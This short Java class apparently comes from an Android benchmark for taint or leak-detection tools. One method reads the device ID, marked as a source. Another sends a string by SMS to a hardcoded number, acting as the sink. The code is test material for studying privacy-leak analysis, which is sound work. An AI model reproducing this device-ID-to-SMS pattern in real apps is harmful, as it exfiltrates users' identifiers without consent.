package disi.unitn.refbench.refbench7;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class BaseClass {
    String str;
    String TAG = "BaseClass";

    public BaseClass() {
        Log.i(TAG, "This is a default constructor!");
    }

    public void method1(Context context){
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        str = telephonyManager.getDeviceId(); //source
    }

    public void method2(String s){
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+391234", null, s, null, null);
    }
}